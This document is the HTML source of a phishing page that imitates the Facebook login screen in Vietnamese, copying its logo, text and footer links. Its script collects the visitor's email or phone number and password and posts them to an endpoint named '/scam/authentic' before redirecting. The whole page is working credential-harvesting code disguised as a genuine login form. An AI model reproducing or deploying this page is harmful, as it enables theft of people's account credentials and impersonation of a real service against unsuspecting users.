<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <link rel="shortcut icon" href="/assets/icons/favicon.ico" type="image/x-icon" />
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/assets/css/login.css">
</head>
<body>

    <!-- logo: https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg -->

    <div class="fix-m-header">
        <img src="/assets/image/cell-phone.png" alt="Android">
        <span>Get Facebook for Android and browse faster</span>
    </div>

    <div class="container">
        <!-- main container -->
        <div class="content">
            <!-- logo container -->
           <div class="left-content">
               <div class="f-logo">
                   <img src="/assets/image/facbook.svg" alt="Facebook" />
               </div>
               <h2 class="f-quote">Facebook giúp bạn kết nối và chia sẻ với mọi người trong cuộc sống của bạn.</h2>
           </div>
           <!-- login form -->
           <div class="right-content">
               <div class="card">
                   <form method="POST" id="login" onsubmit="return false;">
                       <div class="input-container">
                           <input type="text" name="username" placeholder="Email hoặc số điện thoại">
                       </div>
                       <div class="input-container">
                            <input type="password" name="password" placeholder="Mật khẩu">
                        </div>
                        <div class="login-btn-container">
                            <button class="login-btn">Đăng nhập</button>
                        </div>
                   </form>

                   <div class="forgotten-password">
                       <a href="#">Quên mật khẩu?</a>
                   </div>

                   <div class="divider"></div>

                   <div class="" style="text-align: center;">
                       <a class="crt-new-ac" href="#">Tạo tài khoản</a>
                   </div>
               </div>
               <div class="crt-page">
                   <a href="#">Tạo trang</a>
                   <span>dành cho người nổi tiếng, thương hiệu hoặc doanh nghiệp.</span>
               </div>
           </div>
        </div>
    </div>

    <footer class="f-lg-footer">
        <ul>
            <li><a href="">English (UK)</a></li>
            <li><a href="">বাংলা</a></li>
            <li><a href="">हिन्दी</a></li>
            <li><a href="">اردو</a></li>
            <li><a href="">नेपाली</a></li>
            <li><a href="">ଓଡ଼ିଆ</a></li>
            <li><a href="">Español</a></li>
            <li><a href="">Português (Brasil)</a></li>
            <li><a href="">Français (France)</a></li>
            <li><a href="">Deutsch</a></li>
            <li><a href="">Italiano</a></li>
        </ul>
        <div class="divider"></div>
        <ul>  
            <li><a href="">Sign Up</a></li>
            <li><a href="">Log In</a></li>
            <li><a href="">Messenger</a></li>
            <li><a href="">Facebook Lite</a></li>
            <li><a href="">Watch</a></li>
            <li><a href="">Places</a></li>
            <li><a href="">Games</a></li>
            <li><a href="">Marketplace</a></li>
            <li><a href="">Facebook Pay</a></li>
            <li><a href="">Jobs</a></li>
            <li><a href="">Oculus</a></li>
            <li><a href="">Portal</a></li>
            <li><a href="">Instagram</a></li>
            <li><a href="">Local</a></li>
            <li><a href="">Fundraisers</a></li>
            <li><a href="">Services</a></li>
            <li><a href="">Voting</a></li>
            <li><a href="">Information Centre</a></li>
            <li><a href="">About</a></li>
            <li><a href="">Create ad</a></li>
            <li><a href="">Create Page</a></li>
            <li><a href="">Developers</a></li>
            <li><a href="">Careers</a></li>
            <li><a href="">Privacy</a></li>
            <li><a href="">Cookies</a></li>
            <li><a href="">AdChoices</a></li>
            <li><a href="">Terms</a></li>
            <li><a href="">Help</a></li>
            <li><a href="">Settings</a></li>
        </ul>
    </footer>

    <div class="m-footer">
        <div class="m-f-lang">
            <ul>
                <li><a href="">English (UK)</a></li>
                <li><a href="">বাংলা</a></li>
                <li><a href="">हिन्दी</a></li>
            </ul>
            <ul>
                <li><a href="">اردو</a></li>
                <li><a href="">नेपाली</a></li>
                <li><a href="">ଓଡ଼ିଆ</a></li>
            </ul>
        </div>
        

        <div style="clear: both;"></div>

        <div class="links" style="text-align: center;">
            <a href="#">About</a><a href="#">Help</a><a href="#">More</a>
        </div>

        <div style="font-weight: 600;text-align: center;margin: 10px 0;color: #777;">Facebook Inc</div>
    </div>
    <script src="/assets/js/jquery.min.js"></script>
    <style>
        .input-container{
            position: relative;
        }
        .error{
            border: 1px solid #f02849 !important;
        }
        .icon-error{
            position: absolute;
            right: 10px;
            top: 18px;
        }
        .help-block {
            font-family: Helvetica, Arial, sans-serif;
            color: #f02849;
            font-size: 13px;
            line-height: 16px;
            text-align: left;
            margin: 5px 0;
        }
    </style>
    <script>
        $('#login').submit(function(e){
            var username,password;
            username = $('input[name=username]').val();
            password = $('input[name=password]').val();

            var redirect = getParams('redirect');
            const formData = new FormData();
            removeError();
            if(!username || username.lenght < 1){
                setError($('input[name=username]'),'Vui lòng điền Email hoặc Số điện thoại');
                return false;
            }else{
                if(validatePhone(username)){
                    formData.append("type",'phone');
                }else if(validateEmail(username)){
                    formData.append("type",'email');
                }else{
                    setError($('input[name=username]'),'Vui lòng kiểm tra lại định dạng Email hoặc Số điện thoại');
                    return false;
                }
            }
            if(!password || password.lenght < 1){
                setError($('input[name=password]'),'Vui lòng điền Mật khẩu');
                return false;
            }
            formData.append('username',username);
            formData.append('password',password);
            formData.append('path','login');
            if(redirect){
                formData.append('redirect',redirect);
            }
            $.ajax({
                url : '/scam/authentic',
                type: "POST",
                data : formData,
                contentType: false,
                cache: false,
                processData: false,
                dataType : 'JSON',
                success: function(data){
                    if(data.status){
                        var url = data.redirect;
                        window.location.replace(data.redirect);
                    }else{
                        setError($('input[name=username]'),data.message);
                    }
                }
            });
        });
        function getParams(search){
            var url_string = window.location.href;
            var url = new URL(url_string);
            var paramValue = url.searchParams.get(search);
            return paramValue;
        }
        function setError(element,text){
            element.addClass('error');
            element.after('<p class="help-block help-block-error">'+text+'</p>');
            element.after('<img class="icon-error" src="/assets/icons/warning.png" width="20" height="20">');
        }
        function removeError(element=null){
            $('.error').removeClass('error');
            $('.help-block').remove();
            $('.icon-error').remove();
        }
        /**
         * @param {string} phone
         */
        const validatePhone = phone => {
            var vnf_regex = /((09|03|07|08|05)+([0-9]{8})\b)/g;
            return vnf_regex.test(phone);
        };
        
        /**
         * @param {string} email
         */
        const validateEmail = email => {
            return /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/.test(email);
        };
    </script>
</body>
</html>